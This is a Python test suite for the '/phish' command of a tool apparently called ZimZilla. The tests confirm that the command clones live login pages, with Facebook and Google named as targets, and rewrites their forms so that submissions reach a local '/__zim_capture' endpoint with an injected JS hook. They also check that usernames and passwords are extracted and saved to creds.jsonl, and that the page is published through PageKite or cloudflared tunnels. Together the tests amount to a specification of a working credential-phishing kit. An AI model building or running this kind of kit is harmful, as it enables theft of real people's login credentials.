"""Regression suite for `/phish` and zim-pane.

Run:  python tests/test_phish.py   (from an activated venv)

Two layers, matching the split in zimzilla/phish.py itself:

* the pure logic — target validation, form rewrite, credential picking, the
  campaign directory, the local server — exercised directly and with no
  terminal;
* the wiring — that the slash dispatch, the help table, the palette, the
  completion popup and the compose tree all actually expose the command and
  the pane, so a rename in one place cannot silently orphan it in another.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from zimzilla import phish  # noqa: E402
from zimzilla.config import Config  # noqa: E402
from zimzilla.scope import HostSet, Scope  # noqa: E402
from zimzilla.ui.app import ZimZillaApp  # noqa: E402
from zimzilla.ui.complete import SLASH_COMMANDS  # noqa: E402
from zimzilla.ui.widgets import ZimPane  # noqa: E402

RESULTS: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, extra: str = "") -> None:
    RESULTS.append((name, ok, extra))
    print(f"{'PASS' if ok else 'FAIL'}  {name}  {extra}")


def _cfg(workdir: Path, **kw) -> Config:
    return Config.from_env(workdir=workdir, api_key="x",
                           base_url="http://localhost:4001", **kw)


# ---------------------------------------------------------------------------
# Target
# ---------------------------------------------------------------------------

def test_target() -> None:
    good = [
        "site.com",
        "https://site.com",
        "http://login.site.com/path",
        "www.example.co.uk",
        "10.0.0.5",
        "SITE.COM/login",
    ]
    for raw in good:
        ok, err = phish.validate_target(raw)
        check(f"validate: accepts {raw}", ok, err)

    bad = ["", "   ", "nope", "not a host", "-bad.com", "http://"]
    for raw in bad:
        ok, _ = phish.validate_target(raw)
        check(f"validate: rejects {raw!r}", not ok)

    check("normalise: strips scheme and path",
          phish.normalise_target("https://Login.Site.COM/app") == "login.site.com")
    check("normalise: empty stays empty",
          phish.normalise_target("  ") == "")
    check("target_url: adds https and keeps the path",
          phish.target_url("site.com/login") == "https://site.com/login")
    check("target_url: keeps an explicit scheme",
          phish.target_url("http://site.com") == "http://site.com")
    check("target_url: facebook host maps to /login",
          phish.target_url("www.facebook.com")
          == "https://www.facebook.com/login/")
    check("target_url: facebook.com (no www) maps to /login",
          phish.target_url("facebook.com")
          == "https://www.facebook.com/login/")
    check("target_url: a pasted facebook path is kept",
          phish.target_url("https://www.facebook.com/login.php")
          == "https://www.facebook.com/login.php")
    check("target_url: unknown host stays on itself",
          phish.target_url("shop.example") == "https://shop.example")

    cands = phish.login_candidates("shop.example")
    check("candidates: unknown host tries /login first after itself",
          cands[0] == "https://shop.example" and
          "https://shop.example/login" in cands,
          str(cands[:4]))
    cands_fb = phish.login_candidates("www.facebook.com")
    check("candidates: facebook starts at the real login url",
          cands_fb[0] == "https://www.facebook.com/login/",
          str(cands_fb[:3]))
    cands_path = phish.login_candidates("shop.example/custom")
    check("candidates: a pasted path is the only guess",
          cands_path == ["https://shop.example/custom"],
          str(cands_path))

    check("looks_like_login: password form counts",
          phish.looks_like_login(
              '<form><input type="password" name="p"></form>'))
    check("looks_like_login: marketing page does not",
          not phish.looks_like_login(
              "<html><body><h1>Welcome</h1><p>shop the sale</p></body>"))
    check("looks_like_login: empty does not",
          not phish.looks_like_login(""))
    check("looks_like_login: a JS Google shell still counts",
          phish.looks_like_login(
              "<!doctype html><html><title>Sign in - Google Accounts</title>"
              "<body></body></html>"))


# ---------------------------------------------------------------------------
# Page rewrite
# ---------------------------------------------------------------------------

def test_rewrite() -> None:
    src = (
        "<html><head><title>x</title></head><body>"
        '<form action="https://real.example/login" method="GET" '
        'onsubmit="return false" target="_blank">'
        '<input name="user"><input name="pass"></form></body></html>'
    )
    page, cloned = phish.build_page("real.example", "https://real.example/login", src)
    check("rewrite: cloned flag is true when html is given", cloned)
    check("rewrite: action points at the capture endpoint",
          'action="/__zim_capture"' in page)
    check("rewrite: method is forced to POST",
          'method="POST"' in page)
    check("rewrite: original action is gone",
          "https://real.example/login" not in page or "<base" in page)
    check("rewrite: onsubmit is stripped", "onsubmit" not in page.lower())
    check("rewrite: a <base href> is injected",
          '<base href="https://real.example/">' in page)

    # A page that already has a <base> is replaced, not doubled.
    already = '<head><base href="https://old.example/"></head><form></form>'
    page2, _ = phish.build_page("real.example", "https://real.example/", already)
    check("rewrite: existing <base> is replaced, not doubled",
          page2.lower().count("<base") == 1)

    # No live html → branded template, still posts here.
    tmpl, cloned = phish.build_page("lab.example", "https://lab.example/", None)
    check("rewrite: template is not marked cloned", not cloned)
    check("rewrite: template posts to the capture endpoint",
          'action="/__zim_capture"' in tmpl)
    check("rewrite: template names the host", "lab.example" in tmpl)
    check("rewrite: a live page gets the JS capture hook",
          "zimHooked" in page)


def test_clone_login_picks_the_real_form() -> None:
    """clone_login must skip a homepage with no form and take /login."""
    pages = {
        "https://shop.example": (
            "<html><title>Shop</title><body>welcome</body></html>",
            "cloned homepage",
        ),
        "https://shop.example/login": (
            '<html><form action="/auth"><input name="email">'
            '<input type="password" name="pass"></form></html>',
            "cloned login",
        ),
    }

    def fake_fetch(url: str, timeout: float = 12.0):
        return pages.get(url, (None, f"miss {url}"))

    saved = phish.fetch_page
    phish.fetch_page = fake_fetch  # type: ignore[assignment]
    try:
        html, note, used = phish.clone_login("shop.example")
        check("clone: skipped the homepage",
              used == "https://shop.example/login", used)
        check("clone: used the live login html",
              html is not None and 'type="password"' in html)
        check("clone: note is the login fetch",
              note == "cloned login", note)

        # A JS-only shell (Google) must still be served, not the generic card.
        js_only = {
            "https://accounts.google.com/ServiceLogin": (
                "<!doctype html><html><title>Sign in - Google Accounts</title>"
                "<body>js app</body></html>",
                "cloned google",
            ),
        }

        def fake_google(url: str, timeout: float = 12.0):
            return js_only.get(url, (None, f"miss {url}"))

        phish.fetch_page = fake_google  # type: ignore[assignment]
        html, note, used = phish.clone_login("www.google.com")
        check("clone: google JS shell is kept",
              html is not None and "Google Accounts" in html, note)
        check("clone: google is not the generic card",
              html is not None and "Sign in to www.google.com" not in html)
    finally:
        phish.fetch_page = saved  # type: ignore[assignment]


def test_pagekite_name_and_order() -> None:
    """PageKite is the first worldwide forwarder; a missing kite is skipped."""
    src = (ROOT / "zimzilla" / "phish.py").read_text()
    check("pagekite: open_tunnel tries pagekite first",
          "attempts = (_open_pagekite, _open_cloudflared" in src)
    check("pagekite: the binary is vendored in packaging/",
          (ROOT / "packaging" / "pagekite" / "pagekite.py").is_file())

    saved = dict(os.environ)
    try:
        os.environ.pop("PAGEKITE_NAME", None)
        os.environ.pop("PAGEKITE_BIN", None)
        os.environ["ZIMZILLA_HOME"] = str(Path("/tmp/zimzilla-no-such-home"))
        # Reload lookup against the empty home.
        name = phish.pagekite_name()
        check("pagekite: no env and no file → empty name", name == "", name)
        os.environ["PAGEKITE_NAME"] = "zim.pagekite.me"
        check("pagekite: PAGEKITE_NAME wins",
              phish.pagekite_name() == "zim.pagekite.me")
    finally:
        for k in ("PAGEKITE_NAME", "PAGEKITE_BIN", "ZIMZILLA_HOME"):
            if k in saved:
                os.environ[k] = saved[k]
            else:
                os.environ.pop(k, None)

    tun = phish._open_pagekite(9)
    check("pagekite: missing kite name is a skip, not a hang",
          not tun.ok and "PAGEKITE_NAME" in tun.error, tun.error)


def test_pick_credentials() -> None:
    user, pw = phish.pick_credentials({"email": "a@b.co", "password": "s3cret"})
    check("creds: email + password", user == "a@b.co" and pw == "s3cret",
          f"{user!r} {pw!r}")

    user, pw = phish.pick_credentials({"Username": "bob", "Passwd": "x"})
    check("creds: case-insensitive keys", user == "bob" and pw == "x")

    user, pw = phish.pick_credentials({"q": "only-this"})
    check("creds: falls back to the first non-password field",
          user == "only-this" and pw == "")

    user, pw = phish.pick_credentials({})
    check("creds: empty map is empty", user == "" and pw == "")


# ---------------------------------------------------------------------------
# Campaign directory + local server
# ---------------------------------------------------------------------------

def test_campaign_dir(wd: Path) -> None:
    cfg = _cfg(wd)
    cfg.state_dir = wd / "state"
    d = phish.campaign_dir(cfg, "https://Login.Site.COM/app")
    check("campaign_dir: lives under state_dir/phish",
          d.parent == cfg.state_dir / "phish", str(d))
    check("campaign_dir: named after the host, not the scheme",
          d.name.startswith("login.site.com-"), d.name)
    check("campaign_dir: exists", d.is_dir())


def test_server(wd: Path) -> None:
    cfg = _cfg(wd)
    cfg.state_dir = wd / "srv-state"
    events: list[dict] = []

    camp = phish.start(
        cfg, "lab.example",
        on_event=events.append,
        fetch=False,
        tunnel=False,
    )
    try:
        check("server: campaign is alive", camp.alive)
        check("server: local url is loopback",
              camp.local_url.startswith("http://127.0.0.1:"))
        check("server: no public url without a tunnel", camp.public_url == "")
        check("server: index.html was written",
              (camp.directory / "index.html").is_file())
        check("server: a ready event was emitted",
              any(e.get("kind") == "ready" for e in events),
              f"{[e.get('kind') for e in events]}")

        # GET the page.
        with urllib.request.urlopen(camp.local_url, timeout=2) as resp:
            body = resp.read().decode("utf-8", "replace")
        check("server: GET returns the login page", "lab.example" in body)
        check("server: GET is logged as a hit",
              any(e.get("kind") == "hit" and e.get("method") == "GET"
                  for e in events))

        # POST credentials.
        data = urllib.parse.urlencode({
            "email": "victim@lab.example",
            "password": "hunter2",
        }).encode()
        req = urllib.request.Request(
            camp.local_url + "__zim_capture", data=data, method="POST",
        )
        with urllib.request.urlopen(req, timeout=2) as resp:
            thanks = resp.read().decode("utf-8", "replace")
        check("server: POST returns the holding page", "Checking" in thanks)
        creds = [e for e in events if e.get("kind") == "cred"]
        check("server: POST emitted a cred event", len(creds) == 1,
              f"{len(creds)}")
        if creds:
            check("server: captured the email",
                  creds[0].get("user") == "victim@lab.example")
            check("server: captured the password",
                  creds[0].get("password") == "hunter2")

        # Persistence.
        check("server: hits.jsonl exists", camp.log_path.is_file())
        check("server: creds.jsonl exists", camp.creds_path.is_file())
        lines = camp.creds_path.read_text(encoding="utf-8").strip().splitlines()
        check("server: creds.jsonl has one record", len(lines) == 1)
        rec = json.loads(lines[0])
        check("server: jsonl record has the password",
              rec.get("password") == "hunter2")
    finally:
        stopped = phish.stop()
        check("server: stop() returns the campaign", stopped is camp)
        check("server: campaign is no longer alive", camp.alive is False)
        check("server: active() is None after stop", phish.active() is None)
        # The port should refuse new connections.
        refused = False
        try:
            urllib.request.urlopen(camp.local_url, timeout=1)
        except (urllib.error.URLError, TimeoutError, OSError):
            refused = True
        check("server: port is closed after stop", refused)


# ---------------------------------------------------------------------------
# Scope
# ---------------------------------------------------------------------------

def test_scope_blocks_denied_host() -> None:
    scope = Scope()
    scope.deny_path = Path("/tmp/out-of-scope.yaml")  # presence is what arms deny
    scope.deny = HostSet(domains={"bank.example"})
    allowed, reason = scope.allows("bank.example")
    check("scope: denied host is refused", not allowed, reason)
    allowed, _ = scope.allows("lab.example")
    check("scope: an unlisted host is still reachable", allowed)


# ---------------------------------------------------------------------------
# ZimPane
# ---------------------------------------------------------------------------

def test_zim_pane() -> None:
    from zimzilla.theme import get_palette

    # Constructed off-app: Static.update needs an active Textual app, so this
    # test drives the state machine with render_pane stubbed out. The live
    # paint is covered by test_ui.
    pane = ZimPane(get_palette("green"))
    pane.render_pane = lambda: None  # type: ignore[method-assign]
    check("pane: hidden until a campaign starts",
          not pane.has_class("visible"))
    pane.show_campaign("lab.example")
    check("pane: visible after show_campaign", pane.has_class("visible"))
    check("pane: host is set", pane.host == "lab.example")

    pane.note({
        "kind": "ready",
        "host": "lab.example",
        "local": "http://127.0.0.1:9/",
        "public": "https://x.trycloudflare.com",
        "tool": "cloudflared",
        "clone": "template (fetch skipped)",
        "cloned": False,
    })
    check("pane: ready event sets the public url",
          pane.public_url == "https://x.trycloudflare.com")
    pane.note({
        "kind": "cred",
        "user": "a@b.co",
        "password": "pw",
        "method": "POST",
        "path": "/__zim_capture",
    })
    check("pane: cred event is stored",
          len(pane.creds) == 1 and pane.creds[0]["user"] == "a@b.co")
    pane.note({"kind": "stopped"})
    check("pane: stopped event clears alive", pane.alive is False)

    pane.minimize()
    check("pane: minimize marks the pane minimized", pane.minimized)
    check("pane: minimize keeps it visible", pane.has_class("visible"))
    check("pane: minimize adds the minimized class", pane.has_class("minimized"))
    pane.restore()
    check("pane: restore clears minimized", not pane.minimized)
    check("pane: restore drops the minimized class", not pane.has_class("minimized"))
    pane.close_pane()
    check("pane: close hides the pane", not pane.has_class("visible"))
    check("pane: close does not kill the campaign flag", pane.alive is False)
    pane.show_campaign("lab.example")
    check("pane: a new campaign un-hides a closed pane", pane.has_class("visible"))
    pane.minimize()
    pane.show_campaign("other.example")
    check("pane: a new campaign un-minimizes", not pane.minimized)

    pane._apply_width(10)
    check("pane: width floors at MIN_WIDTH", pane._width == pane.MIN_WIDTH)
    pane._apply_width(200)
    check("pane: width caps at MAX_WIDTH", pane._width == pane.MAX_WIDTH)
    pane._apply_width(48)
    check("pane: width accepts a value in range", pane._width == 48)


# ---------------------------------------------------------------------------
# Wiring
# ---------------------------------------------------------------------------

def test_wiring() -> None:
    names = [c for c, _ in SLASH_COMMANDS]
    check("wiring: /phish is in the completion menu", "/phish" in names, f"{names}")

    app_src = (ROOT / "zimzilla" / "ui" / "app.py").read_text()
    check("wiring: dispatch has a phish entry", '"phish": lambda a:' in app_src)
    check("wiring: _cmd_phish is defined", "def _cmd_phish(" in app_src)
    check("wiring: help table lists it", '("/phish <host>"' in app_src)
    check("wiring: palette lists it",
          '("/phish", "clone a login page and harvest creds", "phish")' in app_src)
    check("wiring: compose yields ZimPane", "yield ZimPane(" in app_src)

    widgets_src = (ROOT / "zimzilla" / "ui" / "widgets.py").read_text()
    check("wiring: ZimPane class exists", "class ZimPane(" in widgets_src)


# ---------------------------------------------------------------------------
# Live UI
# ---------------------------------------------------------------------------

async def test_ui(wd: Path) -> None:
    """Drive the command through the live app: menu, refusal, happy path."""
    cfg = _cfg(wd, boot_rain=False)
    cfg.state_dir = wd / "ui-state"

    app = ZimZillaApp(cfg)
    async with app.run_test(size=(140, 40)) as pilot:
        app.pop_screen()
        await pilot.pause()

        app._handle_command("/phish")
        await pilot.pause()
        check("ui: bare /phish does not start a campaign",
              phish.active() is None and app.busy is False)

        app._handle_command("/phish not a host")
        await pilot.pause()
        check("ui: a bad host is refused",
              phish.active() is None and app.busy is False)

        app._handle_command("/phish stop")
        await pilot.pause()
        check("ui: stop with nothing running stays idle", app.busy is False)

        # Deny-list must refuse before a campaign is created.
        app.agent.scope.deny_path = wd / "out-of-scope.yaml"
        app.agent.scope.deny = HostSet(domains={"blocked.example"})
        app._handle_command("/phish blocked.example")
        await pilot.pause()
        check("ui: a denied host is refused",
              phish.active() is None and app.busy is False)
        check("ui: a refused run creates no campaign dir",
              not list((cfg.state_dir / "phish").glob("blocked.example-*")))

        # Don't actually fetch or tunnel in the UI test — stub start() so the
        # worker returns a real local campaign without touching the network.
        real_start = phish.start

        def fake_start(cfg_, target, on_event=None, **kw):
            return real_start(cfg_, target, on_event=on_event,
                              fetch=False, tunnel=False)

        phish.start = fake_start  # type: ignore[assignment]
        try:
            app._handle_command("/phish lab.example")
            # The launch is a @work worker; give it a few ticks.
            for _ in range(20):
                await pilot.pause()
                if phish.active() is not None and not app.busy:
                    break
            camp = phish.active()
            check("ui: a valid host launches the campaign",
                  camp is not None and camp.alive, str(camp))
            if camp is not None:
                check("ui: campaign dir was created", camp.directory.is_dir())
                check("ui: zim-pane is visible",
                      app.query_one(ZimPane).has_class("visible"))
                check("ui: zim-pane host matches",
                      app.query_one(ZimPane).host == "lab.example")

            app._handle_command("/phish status")
            await pilot.pause()
            check("ui: status leaves the campaign running",
                  phish.active() is not None)

            app._handle_command("/phish stop")
            await pilot.pause()
            check("ui: stop tears the campaign down", phish.active() is None)
        finally:
            phish.start = real_start  # type: ignore[assignment]
            phish.stop()


async def main() -> int:
    with tempfile.TemporaryDirectory() as td:
        tmp = Path(td)
        test_target()
        test_rewrite()
        test_clone_login_picks_the_real_form()
        test_pagekite_name_and_order()
        test_pick_credentials()
        test_campaign_dir(tmp)
        test_server(tmp)
        test_scope_blocks_denied_host()
        test_zim_pane()
        test_wiring()
        await test_ui(tmp)

    failed = [n for n, ok, _ in RESULTS if not ok]
    print(f"\n{len(RESULTS) - len(failed)}/{len(RESULTS)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
